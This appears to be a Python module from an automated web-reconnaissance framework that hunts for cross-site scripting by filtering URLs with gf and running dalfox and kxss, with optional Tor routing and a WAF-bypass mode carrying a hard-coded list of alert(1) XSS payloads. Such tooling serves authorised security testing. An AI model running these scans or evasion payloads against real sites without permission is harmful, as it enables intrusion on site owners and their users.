#!/usr/bin/env python3
import os
from core.utils import FormatFixer, count_lines

class XSSStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls = self.f["urls"]
        if not os.path.isfile(urls) or count_lines(urls)==0:
            FormatFixer.fix(self.f["live_hosts"], self.f["fmt_url"], "url")
            urls = self.f["fmt_url"]

        xss_params = os.path.join(self.p.out, f"{self.p.prefix}_xss_params.txt")
        xss_out    = self.f["xss_results"]

        # gf filter — check patterns exist first
        self.p.shell(f"cat {urls} 2>/dev/null | gf xss > {xss_params} 2>/dev/null", label="gf xss")
        # Fallback: use all URLs if gf returns nothing
        if count_lines(xss_params) == 0:
            self.log.warn("gf xss returned nothing — using all URLs with params")
            self.p.shell(f"grep '=' {urls} > {xss_params} 2>/dev/null")

        src = xss_params if count_lines(xss_params)>0 else urls

        # Auth header
        auth = f"-H 'Cookie: {self.p.args.cookie}'" if getattr(self.p.args,"cookie",None) else ""

        # dalfox
        self.p.shell(
            f"dalfox file {src} --skip-bav --silence --no-color {auth} "
            f"-o {xss_out} 2>/dev/null",
            label="dalfox xss", use_tor=bool(self.p.tor), timeout=600)

        # kxss
        self.p.shell(f"cat {src} | kxss 2>/dev/null",
                     label="kxss", append_file=xss_out)

        # WAF bypass mode
        if getattr(self.p.args,"waf_bypass",False):
            self._waf_bypass_xss(src, xss_out)

        n = count_lines(xss_out)
        if n>0: self.p.add_finding("high","XSS", xss_out, f"{n} potential XSS", "dalfox/kxss")
        self.log.success(f"XSS: {n} → {os.path.basename(xss_out)}")

    def _waf_bypass_xss(self, src, out):
        """Try common WAF bypass XSS payloads."""
        PAYLOADS = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "jaVasCript:alert(1)",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<svg/onload=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
        ]
        payload_file = "/tmp/m7_xss_waf.txt"
        with open(payload_file,"w") as f:
            f.write("\n".join(PAYLOADS)+"\n")
        self.p.shell(
            f"dalfox file {src} --custom-payload {payload_file} "
            f"--silence --no-color -o /tmp/m7_xss_waf_out.txt 2>/dev/null",
            label="xss waf bypass")
        self.p.shell(f"cat /tmp/m7_xss_waf_out.txt >> {out} 2>/dev/null")
